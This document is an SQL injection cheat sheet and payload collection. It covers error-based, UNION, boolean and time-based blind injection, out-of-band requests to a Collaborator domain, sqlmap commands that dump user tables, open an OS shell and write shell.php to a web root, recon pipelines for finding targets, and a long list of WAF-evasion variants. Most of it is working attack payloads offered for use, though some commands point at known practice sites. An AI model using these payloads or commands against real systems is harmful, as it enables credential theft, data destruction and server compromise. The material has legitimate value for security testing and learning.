
You can detect SQL injection manually by testing **input fields** (e.g., login forms, search bars) with:

1️⃣ **Single Quote (`'`) Test**
- Enter a **single quote (`'`)** in an input field and check if an **error message** appears.
- Example: `username'` → If you see an **SQL error**, the input is vulnerable.
- if we found injection point like id’ (throw some error) verify by add id’ — -  then remove check application response. with and without.

2️⃣ **Boolean Condition Test**
- Try entering conditions like **`OR 1=1`** (always true) and **`OR 1=2`** (false).
- If the **application reacts differently** (e.g., logs you in with `OR 1=1`), it's vulnerable.

3️⃣ **Time Delay Test**
- Inject SQL commands that cause a **time delay**, like:
    ```sql
    
    ' OR SLEEP(5) -- -
    ```
- If the **response is delayed**, the system is executing SQL commands.

4️⃣ **Out-of-Band (OAST) Test**
- Use payloads that **force the database to send a request to an external server**, proving SQL execution.


Detection point to be remember:

```xml
<storeId>1+1</storeId>
```

If the application **processes this as a SQL query**, it may execute:

```sql

SELECT stock FROM products WHERE storeId = 1+1;
```

Since SQL evaluates `1+1` to `2`, this is **proof that user input is being interpreted as SQL code** rather than a simple string.

some examples:

```bash
Where clause:
SELECT * FROM users WHERE username = '" + user_input + "' AND password = '" + password + "'";
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'anything';

Update :
UPDATE users SET password = '" + new_password + "' WHERE username = '" + user_input + "'";
UPDATE users SET password = 'hacked' WHERE username = '' OR 1=1 -- ';

Insert statement:
INSERT INTO users (username, email) VALUES ('" + user_input + "', '" + email + "');
INSERT INTO users (username, email) VALUES ('hacker', 'hacker@example.com');
DROP TABLE users; --');


Order by:
SELECT * FROM products ORDER BY '" + user_input + "'";
SELECT * FROM products ORDER BY price, (SELECT version());


```


Using Union Statement:
```bash
When you use a UNION statement in SQL, you’re combining the results of two or more SELECT queries into a single result set. Here are the key points to understand:
Same Number of Columns: Each SELECT statement within the UNION must have the same number of columns. For example, if your first query selects two columns (like username and password), the second query must also select two columns.
Column Data Types: The columns in each SELECT statement must have compatible data types. For instance, if the first column in the first query is a string, the first column in the second query should also be a string. Some database convert int to string but some database throw error. 
Order of Columns: The order of the columns in each SELECT statement should match. If the first query selects username first and password second, the second query should follow the same order.
Here’s a simple example to illustrate:
SQL
- First query selecting two columns
SELECT username, password FROM users
UNION
-- Second query selecting two columns
SELECT product_name, product_code FROM products;
In this example, both queries select two columns, so the UNION works. However, if you tried to select only one column in the second query, it would result in an error:
SQL
- This will cause an error because the number of columns doesn't match
SELECT username, password FROM users
UNION
SELECT product_name FROM products;
```


Identify compatiable data type
```bash
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
' UNION SELECT NULL,NULL,username,password from users -- 
```



Retrieving multiple values within a single column :

```bash
' UNION SELECT username || '~' || password FROM users--

Oracle 	'foo'||'bar'
Microsoft 	'foo'+'bar'
PostgreSQL 	'foo'||'bar'
MySQL 	'foo' 'bar' [Note the space between the two strings]
CONCAT('foo','bar')
```




##### **Error based sql injection**
Sometimes, misconfigured databases return **detailed error messages**, which can help attackers extract data.

```bash
SELECT * FROM tracking WHERE id = ''
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''.

CAST((SELECT username FROM users LIMIT 1) AS INT)
ERROR: invalid input syntax for type integer: "admin"

#MYSQL
(SELECT CAST((SELECT user FROM mysql.user LIMIT 1) AS SIGNED))

#PostgreSQL
(SELECT CAST((SELECT username FROM users LIMIT 1) AS INT))

#MSSQL
(SELECT CONVERT(INT, (SELECT TOP 1 name FROM sys.databases)))

#Oracle:
(SELECT TO_NUMBER((SELECT username FROM dba_users WHERE ROWNUM=1)) FROM dual)

SELECT * FROM tracking WHERE id = 'abc123'';

'
"
' OR '1'='1
" OR "1"="1

```


Force the Database to Leak Data Using Type Conversion Errors

```bash
' AND CAST((SELECT username FROM users LIMIT 1) AS INT)--
' AND TO_NUMBER((SELECT password FROM users WHERE username='admin'))--
' AND CONVERT(INT, (SELECT database()))--
```


Extract Table & Column Names from Error Messages
```bash
' AND (SELECT non_existent_column FROM users)--
' ORDER BY 100--  (Exceeds actual column count, causing an error)
' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)--

```



Leak More Data Using Subqueries
```bash
' AND (SELECT 1/0 FROM dual)--  (Division by zero error)
' AND (SELECT TO_NUMBER((SELECT password FROM users WHERE username='admin')) FROM dual)--
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT username FROM users LIMIT 1), 0x3a, (SELECT password FROM users LIMIT 1)) x FROM information_schema.tables))--
```




 Boolean-Based Blind SQL Injection 

```bash
' OR 1=1--  -- Always true, may log in successfully
' OR 1=0--  -- Always false, should be denied access

' OR (SELECT CASE WHEN (username='admin') THEN 1/0 ELSE 1 END FROM users)--

Cookie: TrackingId=xyz' AND '1'='1
Cookie: TrackingId=xyz' AND '1'='2
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's

```


Awesome function:
```bash
SELECT SUBSTR('HELLO WORLD', 1, 5);
SELECT SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1);
```


Blind SQL Injection (Boolean-Based) Payloads

- **Count the number of databases**
- **Find the length of a specific database name**
- **Extract the database name character by character**
- **Find the number of tables in the database**
- **Find the length and name of each table**
- **Find the number of columns in a specific table**
- **Find the length and name of each column**


Find How Many Databases Exist
```bash
' AND (SELECT COUNT(*) FROM information_schema.schemata) > N --
```


Find the Length of a Specific Database Name
Replace DATABASE() with schema_name if needed. Increase N until FALSE.
```bash
' AND (SELECT LENGTH(DATABASE())) = N --
```

🔹 Step 3: Extract the Database Name Character by Character

```bash
' AND SUBSTRING((SELECT DATABASE()),1,1) = 'a' --
' AND SUBSTRING((SELECT DATABASE()),2,1) = 'b' --
' AND SUBSTRING((SELECT DATABASE()),3,1) = 'c' --
```

🔹 Step 4: Find How Many Tables Are in the Database
```bash
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()) > N --
```

🔹 Step 5: Find the Length of Each Table Name
```bash
' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT N,1) = X --

```

🔹 Step 6: Extract Each Table Name Character by Character
```bash
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT N,1),1,1) = 'a' --

```

 Step 7: Find How Many Columns Are in a Specific Table
```bash
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='table_name') > N --

```

🔹 Step 8: Find the Length of Each Column Name
```bash
' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='table_name' LIMIT N,1) = X --

```


🔹 Step 9: Extract Each Column Name Character by Character
```bash
' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='table_name' LIMIT N,1),1,1) = 'a' --
```

```bash
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abc'
AND (SELECT 1/0)='a'

Cookie: TrackingId=abc' AND (SELECT CASE WHEN (Username='Administrator') THEN 1/0 ELSE 'a' END FROM Users)='a

Cookie: TrackingId=abc' AND (SELECT CASE WHEN (SUBSTRING(Password,1,1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a


```



**Boolean-Based Error Testing**

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

**🔹 MySQL**

```sql

xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='Administrator') > 'm') THEN 1/0 ELSE 'a' END)='a
xyz' AND IF(1=1, SLEEP(5), 'a')='a

```

**🔹 PostgreSQL**

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN ((SELECT SUBSTRING(password FROM 1 FOR 1) FROM users WHERE username='Administrator') > 'm') THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 'a' END)='a

```

**🔹 Microsoft SQL Server (MSSQL)**

```sql

xyz' AND (SELECT CASE WHEN (1=2) THEN CONVERT(INT, 'ABC') ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN CONVERT(INT, 'ABC') ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='Administrator') > 'm') THEN CONVERT(INT, 'ABC') ELSE 'a' END)='a
xyz'; IF (1=1) WAITFOR DELAY '0:0:5' --

```

**🔹 Oracle**
```bash

xyz' AND (SELECT CASE WHEN (1=2) THEN TO_NUMBER('ABC') ELSE 'a' END FROM dual)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN TO_NUMBER('ABC') ELSE 'a' END FROM dual)='a
xyz' AND (SELECT CASE WHEN ((SELECT SUBSTR(password,1,1) FROM users WHERE username='Administrator') > 'm') THEN TO_NUMBER('ABC') ELSE 'a' END FROM dual)='a
' AND (SELECT CASE WHEN SUBSTR(password,§1§,1) = '§a§' THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username='administrator') = 'a' --
xyz' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 'a' END FROM dual)='a

```



List of different statement that trigger some error for different database.

**MySQL (Division by Zero)**

```sql
sql
CopyEdit
1/0
(SELECT 1/0)
(SELECT COUNT(*) FROM users WHERE 1/0)
(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)

```

---

**🔹 PostgreSQL (Division by Zero)**

```sql
sql
CopyEdit
1/0
(SELECT 1/0)
(SELECT COUNT(*) FROM users WHERE 1/0)
(SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)

```

---

**🔹 Microsoft SQL Server (Type Conversion Error)**

```sql
sql
CopyEdit
CONVERT(INT, 'ABC')
CAST('ABC' AS INT)
(SELECT CONVERT(INT, 'ABC'))
(SELECT COUNT(*) FROM users WHERE CONVERT(INT, 'ABC')=1)
(SELECT CASE WHEN (1=1) THEN CONVERT(INT, 'ABC') ELSE 1 END)

```

---

**🔹 Oracle (Invalid Number Conversion)**

```sql

TO_NUMBER('ABC')
CAST('ABC' AS NUMBER)
(SELECT TO_NUMBER('ABC') FROM dual)
(SELECT COUNT(*) FROM users WHERE TO_NUMBER('ABC')=1)
(SELECT CASE WHEN (1=1) THEN TO_NUMBER('ABC') ELSE 1 END FROM dual)

```

---

**🔹 SQLite (Invalid Function or Type Mismatch)**

```bash
CAST('ABC' AS INTEGER)
(SELECT CAST('ABC' AS INTEGER))
(SELECT COUNT(*) FROM users WHERE CAST('ABC' AS INTEGER)=1)
(SELECT CASE WHEN (1=1) THEN CAST('ABC' AS INTEGER) ELSE 1 END)
```



 Time-Based Blind SQL Injection

```bash
' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s', SLEEP(5), 0)--

' IF (1=1) WAITFOR DELAY '00:00:05'--  -- Causes a 5-second delay
' IF (1=0) WAITFOR DELAY '00:00:05'--  -- No delay if false
```


| **Database** | **Injected Payload** | **Backend Query Execution** |
| --- | --- | --- |
| **MySQL** | `' OR SLEEP(5) --` | `SELECT * FROM tracking WHERE id = '12345' OR SLEEP(5) --'` |
| **PostgreSQL** | `' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END) --` | `SELECT * FROM tracking WHERE id = '12345' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END) --'` |
| **MSSQL** | `' IF (1=1) WAITFOR DELAY '0:0:5' --` | `SELECT * FROM tracking WHERE id = '12345' IF (1=1) WAITFOR DELAY '0:0:5' --'` |
| **Oracle** | `' OR (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual) --` | `SELECT * FROM tracking WHERE id = '12345' OR (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual) --'` |



| **Database** | **Universal Time-Based Payload** |
| --- | --- |
| **MySQL** | `' OR SLEEP(5) --` |
| **PostgreSQL** | `' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END) --` |
| **MSSQL** | `' OR IF (1=1) WAITFOR DELAY '0:0:5' --` |
| **Oracle** | `' OR (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual) --` |



1️⃣ **Use `OR` for Boolean conditions (`WHERE`, `HAVING`).**
2️⃣ **Use `||` for string concatenation (PostgreSQL, Oracle).**

3️⃣ **Use `+` for string concatenation in MSSQL.**

4️⃣ **Use `CONCAT()` for MySQL and Oracle when combining strings.**

5️⃣ **If `pg_sleep(5)` fails, try wrapping it in a `CASE` statement.**


```bash
Blind SQL Injection

Tips: 
1. Gather all urls from gau/waybackurls and Google Dorking. 
2. Inject SQLi payload in all parameters one by one. 
3. Analyze the response. 

Payload used: 
0'XOR(if(now()=sysdate(),sleep(10),0)) XOR'Z
```

**Inject a payload** that makes the database send an **external request**.
2️⃣ If the database is vulnerable, it will make a request to the attacker's server.
3️⃣ The attacker captures this request using a **Burp Collaborator**, **Interactsh**, or a custom DNS logging server.
4️⃣ **If the request is received, SQL injection is confirmed!**
5️⃣ The attacker can also **exfiltrate data** inside the request (like database names, table names, etc.).



 Open Burp Suite → Collaborator Client.
2️⃣ Click "Copy to clipboard" to get a unique domain (e.g., abc123.burpcollaborator.net).
3️⃣ Inject an OAST payload using this domain.

'; exec master..xp_dirtree '\\abc123.burpcollaborator.net\a' --

4️⃣ Click "Poll now" in Burp Collaborator to check for DNS requests.
5️⃣ If a request appears, SQL injection is confirmed!





```bash
- Techniques                                    -u
- Crawl                                         --forms                                                 
- Enumeration                                   --data
- Batch                                         --headers
- Risk                                          --user-agent
- Level                                         --cookie                              
- Threads                                       --flush-session
- Verbosity                                     --output-dir
- Proxy                                         --tamper                                            
- SQL injection Via Burp-Suite                                    
```


https://acorzo1983.github.io/SQLMapCG/

—risk 1: 

- **1** which is innocuous for the majority of SQL injection points.
- Risk value 2 adds to the default level the tests for heavy query time-based SQL injections
- value 3 adds also `OR`-based SQL injection tests.

-v 4:

- increase the verbosity level.

Enumeration:

—current-user : current user of database

—current-db    : current database

—hostname : current hostname

—dbs : current database used.

-D database_name : select database

—tables : fetch tables from selected database.

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch -D acuart --tables 
```

-T : select table.

—dump : dump all data from tables.

```bash
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch -D acuart -T users --dump
```

—columns : show columns and there data  type for selected database and table.

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch -D acuart -T users --columns
```

Specify the custom header for request:

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --crawl 3 --headers="Referer:abc.com" -v 4 --batch
```

—user-agent=”user agent name”:  specify the user agent name.

—random-agent 

—mobile

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --user-agent="Google_gecko" -v 4
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --mobile
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --batch --random-agent -v 4
```

--list-tampers : show all the tampers for bypass firewall.

used specific tamper.

```bash
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --tamper=base64encode -v 3 --batch
```

—forms  : used with form url like [domani.com/login.php](http://domani.com/login.php) where the input field exits.

```bash
sqlmap -u "http://testphp.vulnweb.com/login.php" --forms  #now sqlmap ask for information about form data . choose options carefully
```

—data: send form data redirect url.

```bash
sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=abc&pass=abc&login=submit" --dbs
```

—proxy=”http://proxyip:ports” pass the sqlmap request to proxy like burpsute.

```bash
sqlmap -u "http://testphp.vulnweb.com" --crawl 3 --batch --proxy='http://127.0.0.1:8080'
```

-r req.txt : pass request file add * for injection point to sqlmap .

—cookie : send cookie with request

—os-shell and —os-cmd:  if the database user is root user then this will works.

using the google dork to identify the sql injection

```
sqlmap –g "inurl: ?id=1"
```

list of url to test for sql injection.

```
sqlmap -m /root/Desktop/bulkfile.txt --dbs
```

```bash
sqlmap -u 'protocol://test.server/test_url/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='[https://localhost:7777](https://localhost:7777/)'  --dbs --dbms='mysql' --os='linux' --ignore-code=404 --output-dir=./sqlmapdir/ --level=2
```

```bash
sqlmap -u 192.168.1.124/sqli/Less-1/?id=1 --file-read=/xampp/htdocs/index.php --batch
```

```bash
sqlmap -u 192.168.1.124/sqli/Less-1.?id=1 --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch
```



- [SQLMap](https://github.com/sqlmapproject/sqlmap) – Automatic SQL Injection And Database Takeover Tool
- [jSQL Injection](https://github.com/ron190/jsql-injection) – Java Tool For Automatic SQL Database Injection
- [BBQSQL](https://github.com/Neohapsis/bbqsql) – A Blind SQL-Injection Exploitation Tool
- [NoSQLMap](https://github.com/codingo/NoSQLMap) – Automated NoSQL Database Pwnage
- [Whitewidow](https://www.kitploit.com/2017/05/whitewidow-sql-vulnerability-scanner.html) – SQL Vulnerability Scanner
- [DSSS](https://github.com/stamparm/DSSS) – Damn Small SQLi Scanner
- [explo](https://github.com/dtag-dev-sec/explo) – Human And Machine Readable Web Vulnerability Testing Format
- [Blind-Sql-Bitshifting](https://github.com/awnumar/blind-sql-bitshifting) – Blind SQL-Injection via Bitshifting
- [Leviathan](https://github.com/leviathan-framework/leviathan) – Wide Range Mass Audit Toolkit
- [Blisqy](https://github.com/JohnTroony/Blisqy) – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)

```bash
for possible SQL technology detection:
subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

for single domain:
subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

for possible SQL Endpoints:
echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E '\?[^=]+=.+$'
```

```bash
?id=1' order by 1 --+
?id=1' and "a"="a"--+
?id=1' and database()="securtiy"--+
?id=1' and substring(database(),1,1)="a"--+
?id=1' and sleep(2) and "a"="a"--+
?id=1' and sleep(2) and substring(database(),1,1)="a"--+
```



```bash
/*!50000%55nIoN*/ /*!50000%53eLeCt*/
%55nion(%53elect 1,2,3)-- -
+union+distinct+select+
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//*--*//*!all*//*--*//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+UnIoN/*&a=*/SeLeCT/*&a=*/
union+sel%0bect
+uni*on+sel*ect+
+#1q%0Aunion all#qa%0A#%0Aselect
union(select (1),(2),(3),(4),(5))
UNION(SELECT(column)FROM(table))
%23xyz%0AUnIOn%23xyz%0ASeLecT+
%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
union(select(1),2,3)
union (select 1111,2222,3333)
uNioN (/*!/**/ SeleCT */ 11)
union (select 1111,2222,3333)
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
/union\sselect/g
/union\s+select/i
/*!UnIoN*/SeLeCT
+UnIoN/*&a=*/SeLeCT/*&a=*/
+uni>on+sel>ect+
+(UnIoN)+(SelECT)+
+(UnI)(oN)+(SeL)(EcT)
+’UnI”On’+'SeL”ECT’
+uni on+sel ect+
+/*!UnIoN*/+/*!SeLeCt*/+
/*!u%6eion*/ /*!se%6cect*/
uni%20union%20/*!select*/%20
union%23aa%0Aselect
/**/union/*!50000select*/
/^.*union.*$/ /^.*select.*$/
/*union*/union/*select*/select+
/*uni X on*/union/*sel X ect*/
+un/**/ion+sel/**/ect+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?<ion sel="">+un/**/ion+se/**/lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*!UnIoN*/SeLecT+
```


WAF bypass:
```bash
' OR '1'='1' --
' OR 1=1 LIMIT 1 --+
' UNION/**/SELECT/**/null,null--
1'/**/OR/**/1=1--+
' OR ASCII(SUBSTRING((SELECT user()),1,1)) > 64 --
1' OR SLEEP(5) -- (Blind SQLi)
'UNION%0ASELECT%201,2,3--
' OR 1=CONVERT(int, (SELECT @@version))--
```



###### Other imp cheatsheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://acorzo1983.github.io/SQLMapCG/